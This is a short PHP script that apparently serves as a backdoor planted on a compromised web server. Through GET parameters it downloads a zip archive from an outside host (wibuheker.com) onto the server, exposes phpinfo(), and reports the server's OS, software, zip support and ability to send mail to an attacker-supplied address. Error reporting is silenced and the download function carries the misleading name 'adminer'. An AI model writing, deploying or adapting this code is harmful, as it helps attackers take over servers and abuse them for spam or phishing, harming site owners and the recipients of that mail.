<?php
error_reporting(0);

function adminer($url, $isi) {
	$fp = fopen($isi, "wb");
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_FILE, $fp);
	return curl_exec($ch);
	curl_close($ch);
	fclose($fp);
	ob_flush();
	flush();
}

if(isset($_GET['phpinfo']))
{
    phpinfo();
    die();
}

if(isset($_GET['ofc']))
{
	if(adminer('http://wibuheker.com/files/ofc3.zip', 'ofc3.zip'))
	{
		echo('spawned ofc3.zip');
	} else {
		echo('cant spawn ofc3.zip');
	}
}

if(isset($_GET['valid']))
{
    $site = NULL;
    $damn = php_uname();
    $site->info = $damn;
    $site->software = $_SERVER['SERVER_SOFTWARE'];
    $site->valid = true;
    // Multiple recipients
    $to = $_GET['email']; // note the comma
    
    // Subject
    $subject = 'Delivery testing';
    
    // Message
    $message = 'Here is product id: '.$_GET['id'];
    
    // To send HTML mail, the Content-type header must be set
    $headers[] = 'MIME-Version: 1.0';
    $headers[] = 'Content-Type: text/plain; charset=iso-8859-1';
    // Additional headers
    $headers[] = 'From: support@'.$_SERVER['SERVER_NAME'];
    $headers[] = 'Reply-To: support@'.$_SERVER['SERVER_NAME'];
    // Mail it
    $result = mail($to, $subject, $message, implode("\r\n", $headers));
    if(!$result) {   
        $site->delivery = false;
    } else {
        $site->delivery = true;
    }

    $actual_link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $actual_link.'?phpinfo');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $result = curl_exec($ch);
    curl_close($ch);

    if (strpos($result, '<td class="e">Zip </td><td class="v">enabled') !== false) {
        $site->zip = true;
    }
    else
    {
        $site->zip = false;
    }

    $myJSON = json_encode($site);
    
    echo $myJSON;
    die();
}

?>